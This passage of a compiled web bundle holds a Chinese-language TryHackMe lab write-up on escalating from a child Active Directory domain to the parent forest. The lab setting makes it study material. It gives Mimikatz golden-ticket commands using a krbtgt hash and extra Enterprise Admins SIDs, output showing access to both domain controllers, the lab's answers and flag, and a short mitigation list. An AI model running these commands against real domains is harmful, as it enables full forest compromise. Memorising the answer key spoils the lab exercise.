THMDC.za.tryhackme.loc\nEnabled           : True\nName              : THMDC\nObjectClass       : computer\nObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b\nSamAccountName    : THMDC$\nSID               : S-1-5-21-3885271727-2693558621-2658995185-1001\nUserPrincipalName :\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u8be2\u7236\u57df\u63a7\u5236\u5668\u6765\u6062\u590d Enterprise Admins \u7ec4\u7684 SID\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:'PS C:\\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc\n\nDistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc\nGroupCategory     : Security\nGroupScope        : Universal\nName              : Enterprise Admins\nObjectClass       : group\nObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de\nSamAccountName    : Enterprise Admins\nSID               : S-1-5-21-3330634377-removed-519\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528\u57df\u4fe1\u4efb",children:"\u5229\u7528\u57df\u4fe1\u4efb"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u6700\u7ec8\u62e5\u6709\u4e86\u521b\u5efa\u4f2a\u9020 TGT \u6240\u9700\u7684\u6240\u6709\u4fe1\u606f\u3002\u6211\u4eec\u5c06\u4f7f\u7528 Mimikatz \u751f\u6210\u8fd9\u4e2a Golden Ticket\u3002\u547d\u4ee4\u4f1a\u7c7b\u4f3c\u4e8e\u8fd9\u6837\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt\nUser      : Administrator\nDomain    : za.tryhackme.loc (ZA)\nSID       : S-1-5-21-3885271727-2693558621-2658995185-1001\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nExtra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;\nServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt\nService   : krbtgt\nLifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM\n-> Ticket : ** Pass The Ticket **\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u6211\u4eec\u5c06\u9a8c\u8bc1\u8be5\u7968\u8bc1\u662f\u5426\u53ef\u7528\u4e8e\u8bbf\u95ee THMDC\uff0c\u56e0\u4e3a\u5b83\u662f\u5b50\u57df\u7ba1\u7406\u5458\u7528\u6237\u7684\u6709\u6548\u7968\u8bc1\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\>dir \\\\thmdc.za.tryhackme.loc\\c$\n Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows\n Volume Serial Number is 1634-22A9\n\n Directory of \\\\thmdc.za.tryhackme.loc\\c$\n\n01/04/2022  08:47 AM               103 delete-vagrant-user.ps1\n04/30/2022  10:24 AM               154 dns_entries.csv\n09/15/2018  08:19 AM    <DIR>          PerfLogs\n03/21/2020  09:31 PM    <DIR>          Program Files\n03/21/2020  09:28 PM    <DIR>          Program Files (x86)\n04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1\n04/25/2022  07:13 PM    <DIR>          tmp\n04/27/2022  08:22 AM    <DIR>          Users\n04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\\\vboxsvr\\vagrant]\n04/27/2022  08:12 PM    <DIR>          Windows\n               7 File(s)      2,356,811 bytes\n               7 Dir(s)  50,913,189,888 bytes free;\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u81f3\u5c11\u786e\u8ba4\u4e86 Golden Ticket \u662f\u7528\u4e8e\u8bbf\u95ee\u5b50\u57df DC \u7684\u4f2a\u9020\u7968\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e\u6211\u4eec\u6307\u5b9a\u4e86\u989d\u5916\u7684 SID\uff0c\u6211\u4eec\u73b0\u5728\u5e94\u8be5\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u7236\u57df DC \u4e86\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\>dir \\\\thmrootdc.tryhackme.loc\\c$\\\n Volume in drive \\\\thmrootdc.tryhackme.loc\\c$ is Windows\n Volume Serial Number is 1634-22A9\n\n Directory of \\\\thmrootdc.tryhackme.loc\\c$\n\n01/04/2022  08:47 AM               103 delete-vagrant-user.ps1\n09/15/2018  08:19 AM    <DIR>          PerfLogs\n03/21/2020  09:31 PM    <DIR>          Program Files\n03/21/2020  09:25 PM    <DIR>          Program Files (x86)\n04/23/2022  09:21 AM                58 root_dns_entries.csv\n04/23/2022  09:22 AM             1,432 thm-network-setup-dc.ps1\n04/25/2022  05:50 PM    <DIR>          tmp\n04/27/2022  07:54 AM    <DIR>          Users\n04/25/2022  05:50 PM    <SYMLINKD>     vagrant [\\\\vboxsvr\\vagrant]\n04/27/2022  06:29 PM    <DIR>          Windows\n               3 File(s)          1,593 bytes\n               7 Dir(s)  51,105,730,560 bytes free\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u8bc1\u5b9e\u4e86\u6211\u4eec\u73b0\u5728\u5b8c\u5168\u5a01\u80c1\u4e86\u7236\u57df\uff0c\u4ec5\u4ec5\u901a\u8fc7\u5a01\u80c1\u5176\u4e2d\u4e00\u4e2a\u5b50\u57df\uff01"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u7236\u57df\u548c\u5b50\u57df\u4e4b\u95f4\u9ed8\u8ba4\u914d\u7f6e\u4ec0\u4e48\u57df\u4fe1\u4efb\u5173\u7cfb\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Directional trust\n"})}),(0,r.jsx)(n.p,{children:"AD KDC \u7528\u4e8e\u52a0\u5bc6\u548c\u7b7e\u7f72 TGT \u7684\u5e10\u6237\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"KRBTGT\n"})}),(0,r.jsx)(n.p,{children:"TGT \u6388\u4e88\u5bf9\u5f53\u524d\u57df\u4e4b\u5916\u7684\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u7684\u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Inter-Realm TGT\n"})}),(0,r.jsx)(n.p,{children:"\u7ba1\u7406\u5458\u684c\u9762\u6587\u4ef6\u5939 (flag6.txt) \u4e2d THMROOTDC \u4e0a\u5b58\u50a8\u7684\u6807\u5fd7\u7684\u503c\u662f\u591a\u5c11\uff1f"}),(0,r.jsxs)(t,{children:[(0,r.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt\nUser      : Administrator\nDomain    : za.tryhackme.loc (ZA)\nSID       : S-1-5-21-3885271727-2693558621-2658995185-1001\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nExtra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;\nServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt\nService   : krbtgt\nLifetime  : 12/12/2023 1:30:03 PM ; 12/9/2033 1:30:03 PM ; 12/9/2033 1:30:03 PM\n-> Ticket : ** Pass TheTicket**\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\n Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session\n"})})]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{Full.EA.Compromise}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528 AD \u9700\u8981\u65f6\u95f4\u53bb\u638c\u63e1\uff0c\u6240\u4f7f\u7528\u7684\u6280\u672f\u9ad8\u5ea6\u4f9d\u8d56\u4e8e\u88ab\u653b\u51fb\u7684 AD \u7ed3\u6784\u7684\u914d\u7f6e\u3002\u6700\u91cd\u8981\u7684\u662f\u8981\u660e\u767d\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u5faa\u73af\u7684\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u80fd\u8fd0\u884c\u4e00\u4e2a\u5355\u4e00\u7684\u5f15\u5bfc\u5230\u6839\u6743\u9650\u7684\u653b\u51fb\u6765\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u3002\u6700\u4f73\u65b9\u5f0f\u662f\u6267\u884c\u80fd\u591f\u8fdb\u4e00\u6b65\u63d0\u5347\u4f60\u6743\u9650\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u5229\u7528\u5df2\u7ecf\u83b7\u5f97\u7684\u6743\u9650\u518d\u6b21\u8fdb\u884c\u679a\u4e3e\uff0c\u5bfb\u627e\u4ece\u8fd9\u4e2a\u65b0\u4f4d\u7f6e\u53ef\u80fd\u5b58\u5728\u7684\u989d\u5916\u653b\u51fb\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u7f13\u89e3\u63aa\u65bd",children:"\u7f13\u89e3\u63aa\u65bd"}),"\n",(0,r.jsx)(n.p,{children:"AD \u7684\u5229\u7528\uff0c\u5c31\u50cf AD \u7684\u679a\u4e3e\u4e00\u6837\uff0c\u975e\u5e38\u96be\u4ee5\u9632\u5fa1\u3002\u8fd9\u662f\u56e0\u4e3a\u53ef\u80fd\u88ab\u89c6\u4e3a\u53ef\u5229\u7528\u7684\u914d\u7f6e\u9519\u8bef\u5b9e\u9645\u4e0a\u5177\u6709\u5b9e\u9645\u7684\u4e1a\u52a1\u7528\u4f8b\u3002\u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u4e00\u4e9b\u63aa\u65bd\u6765\u9632\u6b62\u5229\u7528\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u6211\u4eec\u9700\u8981\u786e\u4fdd\u6ca1\u6709\u4efb\u4f55\u914d\u7f6e\u4f1a\u7834\u574f\u6211\u4eec\u7684\u5206\u5c42\u6a21\u578b\u3002\u4f4e\u5c42\u7ea7\u7684\u5e10\u6237\u4e0d\u5e94\u5177\u6709\u4e0e\u9ad8\u5c42\u7ea7\u8d44\u6e90\u4ea4\u4e92\u7684\u80fd\u529b\u3002\u6b64\u5916\uff0c\u6765\u81ea\u9ad8\u5c42\u7ea7\u7684\u5e10\u6237\u4e0d\u5e94\u767b\u5f55\u5230\u4f4e\u5c42\u7ea7\u7684\u8d44\u6e90\u4e0a\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5728\u6267\u884c\u6743\u9650\u59d4\u6d3e\u65f6\u5e94\u9075\u5faa\u6700\u5c0f\u6743\u9650\u539f\u5219\u3002\u6b64\u5916\uff0c\u6743\u9650\u59d4\u6d3e\u5e94\u7b26\u5408\u5206\u5c42\u6a21\u578b\uff0c\u786e\u4fdd\u8f83\u4f4e\u5c42\u7ea7\u7684\u5bf9\u8c61\u4e0d\u80fd\u66f4\u6539\u8f83\u9ad8\u5c42\u7ea7\u7684\u5bf9\u8c61\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5e94\u5f3a\u5236\u6267\u884c SMB \u7b7e\u540d\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u542f\u7528\u3002\u8fd9\u5c06\u963b\u6b62\u51ed\u636e\u4e2d\u7ee7\u5c1d\u8bd5\u3002"}),"\n",(0,r.jsx)(n.li,{children:"AD \u5bf9\u8c61\u53ca\u5176\u914d\u7f6e\u5e76\u4e0d\u662f\u5229\u7528\u7684\u552f\u4e00\u8def\u5f84\u3002AD \u670d\u52a1\uff0c\u5982 AD CS\uff0c\u4e5f\u5e94\u88ab\u89c6\u4e3a\u653b\u51fb\u9762\u7684\u4e00\u90e8\u5206\u5e76\u8fdb\u884c\u4fdd\u62a4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u6211\u4eec\u9700\u8981\u5b9e\u65bd\u8db3\u591f\u7684\u5b89\u5168\u63a7\u5236\u6765\u4fdd\u62a4\u96f6\u7ea7\u57fa\u7840\u8bbe\u65bd\u548c\u6211\u4eec\u5b50\u57df\u4e2d\u7684\u5e10\u6237\uff0c\u56e0\u4e3a\u5176\u4e2d\u4e00\u4e2a\u7684\u59a5\u534f\u53ef\u80fd\u5bfc\u81f4\u6574\u4e2a\u6797\u7684\u59a5\u534f\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"AD \u7684\u5229\u7528\u5df2\u7ecf\u5b8c\u6210\uff0c\u63a5\u4e0b\u6765\u7684\u6b65\u9aa4\u662f\u6df1\u5165\u6316\u6398\u6211\u4eec\u7684\u6839\u6743\u9650\uff0c\u4ee5\u786e\u4fdd\u84dd\u961f\u4e0d\u80fd\u7b80\u5355\u5730\u6e05\u9664\u6211\u4eec\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u5c06\u5728\u4e0b\u4e00\u4e2a\u73af\u8282\u4e2d\u8ba8\u8bba\u3002"})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},4170:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231207-160746-cdded1a8c3d10f5db21b2db6c5f4a4b8.png"},9979:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231209-210905-696a03e8b28f426748434d03b4368ffb.png"},6646:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231210-201021-400c3b12b7ca93027be5357592ebfc51.png"},7260:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231210-201059-4894f0e2aa5e589fe809786b118b5455.png"},5974:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231210-211027-7497b418d988088f287649e20544cb7d.png"},409:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231211-211122-d541d7962c51260a4ca793669ab70f15.png"},9733:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231220-202019-ff1eb2534734fbdebbff778b17bc182d.png"},4264:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231221-202109-404054efacc2b51acaa91bf8d9c5a50c.png"},8291:(e,n,i)=>{i.d(n,{Z:()=>r});const r=i.p+"assets/images/image_20231221-202143-8e45d43a045e22b826409a65314ed256.png"},1900:(e,n,i)=>{i.d(n,{Z:()=>r});const r="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWMAAAHDCAIAAAB+vOxYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABaESURBVHhe7d0/j9xWd8fxVfAECQKo3lJ2s0hpYdUESSHDlSsDfgNWm0IP4C7p3KW08TQp7Tdgu3RleIsEaXahMtFWcrmVtRCQdnKG58zJWV6Sh8MhORzu9wNjfO7hvRzOLvmbP9bITzabzRkAdPor+zcAtCMpAORICgA5kgJAjqQAkCMpAORICgA5kgKYxLt37z7++OMnlU8//fT9+/e2YS5yvzc3NzYIpCmbbNBbc1JUj67Otu222qAaWrWjnWpWnU5w1i36c7IjqFhrenPeF45CkuKrr776448/fv7556urqx9++ME2zOX6+vof/vGfamEhQ2nKJhv31uvPaMppHafpWV7r9B+62G+bM67Ge5ntMOZ5jFig58+ff/HFF998842N56K58F//+R+Xl5flcC/5uVs7v33YcYF1D11bfzqN9xibkx7S/I8XS/Ddd999/fXXb968+eSTT6w1I08HqQfHxJacu91qc3wY+21zVG0Ydcz0Wgu59Y5obArtCBs/nOl0k4pDr7WIQ6VDoXWtKWodrbXpvK+86coOTtT3338vv0q5tfExyHuNv/6bv5V/pLDW/pJPNHs+DcocmWmDffRcqIdRm1w2vSMaZ0rtRUpXeaEad+vNsiO8KbUXrmMnOsRJk1cT33777atXr2x8srqSQk9ZG1RiRwo/uQ/RZz+Nl01js1E6Uw5AxZnpqsYJuh8bVHreuw2q+bU94HS9f//+KG86nL/7kH+kkKFt2NPe/5VUT2tlrcoh5/fRrw05AGXjA9iO9tmVLQhLpD7uDwRj+e233z766CMbzC5+hCkOCYvWpJAzNZ67Qjs1h5zQHWu5TrAOV1dX7969s8G8Ykxo55CwqMeBartQy8kaH7U6NkVtGPkdxZ3oMO6t2rJVm6bizht3WE6odeJQNa4ScbdaiI6ZjfuRTuyXS7zGqZPf5qtXr/RzzZnJXV9fX3tMOImJFy9e7HuCNVwkh4gXwFga9znFHe3l6AcAzGnvzym6cfEAqzRyUgBYJV5CA8jxmgJAjqQAkCMpAORICgA5kgJAjqQAkCMpAOS2f57i/v7eRgDQhNcUAHIkBYAcSQEgR1IAyJEUAHIkBYBc/b+S3t3dWQVM7/z83CosW0NSXFxc2ACY0u3tLUlxKnj3ASBHUgDIkRQAcvslxZPAWv3o/H1XdSv3NmD/hxzSsAPoeY8yrWTbip20DbdrAm1GtqFpExDtkRRyPm2C/qeXLpRCb1csfYD+o0jJtBrbsA9f6EUUf6H9f5v7mm7PmNPwdx9yell1PPEsXPcZqVd1rMd9vEv4bWLJRvicQk5Z5UNvakd404cu9oV3vKm10GFPtqZpJ14oHQobt6wtaxU7WmhHaT/ypk4Qcah1jfS7r+QRgyPuR2u5dd532hE2fjjHay1wug5NCjkJ5DRV8cyodaTWQsQl1mqiWxv377yp07QpGlf50IvYF9ppWxs3eb/sKG2KWl9IU259ofA5UmsR6UwbhGFcOIzuQVmrhcxUPtPGu47c2rjp4XiB0zXCa4rSuGeGnHnKxv3Ymj1XKVtZrPXLYLZrQO6u5134se1FVqkBa/GoTJIU47JzuWKtQJqNl1M13VirN1tWsdaOdGa7qNpiQvrKxsD0hifFFGdq9z6H3eMhx1lbq8N5wkLuoowJbUbxSGrDVPfkvXaF1dsjKfREdDKsNbWTiktqnXIPffY/bJWzeT0ekW/ad5+ljntxtjmwDSNpPAZvxqPSjvCmjXcdXyXiQqGbbICTtd9rCvmtO2uFpg+1EFqXm6RQOhQ+jLeq2rJl453uTrViy4eNxXbGjvaFjYsloqPvt1ooHbrY0QnCh1oo3VSyzTu1jg4bm41kk7JxxTve147QobBxe8cLEWucqCN8TqHPPIpzCDgJR0iK7fPOjrXWZWWPq3w4a/3FocMRkgLAySEpAORICgC57WeK/O14OIrb21ursDDl31pIUgB4oPHvN+XdB4AcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYDcoUnxpPhrl8tOasCSntr2PMphA4/Hml9TyMVf+xsfO+KAvxsS6DBCUsTLj2dmYJWmfU0hwaHKoRdKh8LGLWvLOtK+sHHVsWqnttWHsfA60r7yYW2TD7UQWlcbTewDp2KEpJDX7Xrey218Da9D5ReGD72IfaGdtrVxk/dVx5LIO437aWwK7wtrFccjaqsim7GbI4X2gZMw62uKvdjKYu1YF1vjcq5koNE4SaEXWHl1ScdZqzdbVrHWjnTKBBnLpDsHTtS0ryncIddeba0OJ7qex935FEcIHMVoSdH2zK/KrTU2bzezY61vauuL2ianc2zQpM/OrbUTN+mqxp1oR2hTCu0DJ+HQpIgXg4odqZUPG4vtjB3tCxsXS0TsR9oXPtQi0mbcVOtI4XWkfeFDLYT2hY3DTrypHeFDLYCTMNO7j1OnLwcUFzkeIZKil+rVgLHWPoatApaDpACQIykA5EgKALnt53OD/w/GNzc3VgELdnl5aRV6aPw/GB+aFPwOsHD7nqVP/vV/rFqdzb/9vVWd+H+dAxiI1xRYuWGvKX7/57/T4To8+/f/lVteUwCY1oRJ8eeHvKmFKztHMeww5n84C/lxuaUdDyYyYVL8pRKLRh2bHq2Oy48fF45i/KTgSQY9rf5UefbsmVWFclPH5CUYOSnkd9/nSU+m+VkSC68j7Ssf1jb5UAuhdbXRaD8q+7WODoUPtRCxFtWsLRsHtiHbbewIr7UvfBhvtYgaN+lQ2HjHuj2W2KDHTGHjh2vLWk4Vr7F0m83mffD27Vvp9HR9fW1V5fXr11YFtaYMvaNFvI2FisOOmbVNoq3jfOgzy44ORXen7Lu2Jco73vSODqO4SW618I4rN/lQxFrUZnpRLhkwU9Q6ZSFiPYXaWZo6+5f/ln9+P5hcXH5bKvttM0ehD8oeYUZCwOIgGO01hTw59HwL3TjNn1567uRw5T1Ofdcd++/YJAepbLwzbG/92b0Oes63lU3HrM14hN58DOQthrJxU2eZRkuKw3/f858xyz9H5fDkIJW15mL3WrFWb7asYq0d6dR+5voYbbAWcuVvn8mrlwmeAtpUbZ3FGvNzivIk6E8XHrKHqM9ODrnHYQc5ykOb3yGHXVurw/gzl2J9MbFKf7J/j0RPggG/ez97amu9X4qbdFXciW+qzXFxsnZq4k50Tlzim0RtGHXsxDslnSO3Wlh3qLgTqbXotteS2syOtb5J+1LXJqzJ8t9Q7OWU/jT3gBNr3eci+pj/T3P7Ww+nndhv62g9uvX/aW651B3XPE6aRoNq63QUx8U3xLByfENM8A0xAHMgKQDkSAoAOT6nwMoN+5xilficAsC0eE2BleMs3RevKQAMRFIAyJEUAHIkBYAcSQEgR1IAyJEUAHL8eQqs3L5n6dXVlVWr8/LlS6s6Nf55CpICKzcgKZ4+fWqDFfnw4cMhScG7DwA5kgJAjqQAkCMpAORICuBQvzxk3XUhKYARfB6sMixICgA5kgKYkL4fEeXQC6VD4UMtRGwqHc6JpABGYFdwRd6AeFPfjwiptelDL9pm1vSZMx2SAhiBXcGVeBlLrWzcm+9HbqXWZrWnLR3OiaQAJlRFh7HWAWxHFWvNhaQA5jDghYDEgaxqDIX5X1aQFMBU9FJX3a8C+szsv7cp8F1SrBzfJVV8lxTA5EgKADmSAkCOpACQ4xNNrNyATzStWh3+Hk2gFWfpvvhvHwAGIikA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkCOpACQIykA5EgKADmSAkDuyWazub+/t9HZ2d3d3cXFhQ0yNzc3VgELdnl5aRV6uL29PT8/t8HOQUkBYH0ak4J3HwByJAWAHEkBIEdSAMiRFAByJAWAHEkBIEdSAMiRFAByJAWAHEkBIEdSAMiRFAByJAWAHEkBIEdSAMiRFAByJAWAHEkBIEdSAMiRFAByJAWAHEkBIEdSAMiRFAByhybFk4e8qYUrO/M41v2KEe/6iI8CUIcmxaYSi0YdmyZ1rPsdkcTECh4FTh3vPgDkJkwKeTL0l82x8DrSvvJhbZMPtRBaVxuN9p13GrcK7Qsb71g37F/7QoeiHHqhdChs3LJWa6dNYeOq47fAUUyVFHJab9+NbDa1M75sCu8La+3eOMRNtVWRzWiZ4zspt2pftG2qrfWh8CU+9CL2RfdaLVTHHL0FjmKqpGg8rf3sn/mk77hf6Ssb92AL9lnibOWgtcARzf05hV+0M2u8X+lIX1mrB1tQsVZvtqxiLeAUzJoUeq3KRTJKWPTfybj36w7Z27hHAkxt1qTQa1XUnlG9L6y1EzfpqsadaEfEpmtcIrwvrJWJSxrvK7J5xZGLtrUdc6RjFTC7cZKidk7HodbekcLrSPvCh1oI7Qsbh514UztCh847jVuF9pW1Kj5sLJQPG4vtjB3tCxsXSyKdIHxYK4D5zf05RSN9ClVcD8ACLSIptk+gO9bax7BVAPpbRFIAWDiSAkBu+7nA/f29jc7O7u7uLi4ubJC5ubmxCliwy8tLq9DD7e3t+fm5DXYOTQp+B1i4fc/Sn376yarV+fLLL63qRFLgMRqQFC9evLDBilxfXx+SFHxOASBHUgDITZgUf37Im1qsRvmI2h5jn8fef29TG3a0WKsJk+IvlVgs1rhn/IAH23EAC//R4ZEYPyl4ngHUs2fPrCqUmzomL8HISSEx0ec5UKbFQNGhsHFgGyo+rG3yoRZC62qj0b6oDZ03dYLQofNOWYjtgqYJSoeq7KjYjHNi4XWkfeXD2iYfaiG0rjYa7Ue24eEqZeMd6+76WsSO0KGKHa2xdJvN5n3w9u1b6fR0fX1tVeX169dWBbWmDL2jhQ9FrEW5yTsdm0TaiZtEYz+do4Xclh2/Vd7xphcq9mNdu42FisOOmbVNoq3j+kzu6HvTOzoUtU7cNIXaWZr68ccffx+DXFx+Wyr7bTPHIo/LHmFGQsDiIBjtNYU8OfR8R11O0+cWYePJyF3rvQx+8y/LfScu3ZtP6HO/jXP8TvvsYTpyDMrG7dLjXMgjmpm8xVA2buos02hJ4b/4AWSts9Zk5C4GH+dxLeHIq1+RsdYBZCcn+rtIyZUvT+NSyK2ngDZVW2exxvyc4vBf/CjnTcdOdNOw49RVeoXEuo8Bd1dzyJGXxjqeQ4z7iDC1P9m/R7LvJSTiuVJb2HEalau8Ezd1zKnaRvtyq4U3tRhmr13p5I5pvrfaHO+X4iZdFXfim2pzorbl3lFt/SjOUd5pW3Lqlv+GYi8n870POav2PaUGLDlpp/IjmvlO5//eh7/1cNqJ/baO1lNY8/c+5JRyj+qa789+OpUl/4jsECuP9lep0aDaOh3FcfFdUqwc3yVVfJcUwOSmSgp5kWnVPspVw/ZTM8pOuuld+B3Vhh1mODbgcCt8TXHEa0/fgcsBaMFnK1gN3n0sAq8ssHBjfqKpp3t8Xo0dbWoR52jH5/sm7QufI3ya1HGtFnFtbZVV7atc7Nd2VS6p7VmGcZUOpU4Xyq1PxrgGfKJp1eoc8onmaN8Qq33hR27Ljg5Fd6fsOxl6RwsfirKjuufU5vuwVpRL2jre756m2mqMZd9viGHab4jpU6gW3tFiXGPtVo5W2XhKdk/ZffnPEFiaMT+nOK0TXY7WWWsydjcVazWRn173BOBYRksKzQg50QeExXHzZc5777gv2URMYLFG+4aYZ0Tb6R5DROfEJfESqg27te1Wa9c4J3ZS5ZLY6dBnoQx1E7BM/GlurBxn6b7409wABiIpAORICgA5kgJAjk80sXL7nqVXV1dWrc7Lly+t6tT4iSZJgZUbkBRPnz61wYp8+PDhkKTg3QeAHEkBIEdSAMiRFAByJAVwqF8esu66kBTACD4PVhkWJAWAHEkBTEjfj4hy6IXSofChFiI2lQ7nRFIAI7AruCJvQLyp70eE1Nr0oRdtM2v6zJkOSQGMwK7gSryMpVY27s33I7dSa7Pa05YO50RSABOqosNY6wC2o4q15kJSAHMY8EJA4kBWNYbC/C8rSApgKnqpq+5XAX1m9t/bFPguKVaO75IqvksKYHIkBYAcSQEgR1IAyPGJJlZuwCeaVq0Of48m0IqzdF/8tw8AA5EUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHIkBYAcSQEgR1IAyJEUAHJPNpvN/f29jc7O7u7uLi4ubJC5ubmxCliwy8tLq9DD7e3t+fm5DXYOSgoA69OYFLz7AJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQDkSAoAOZICQI6kAJAjKQD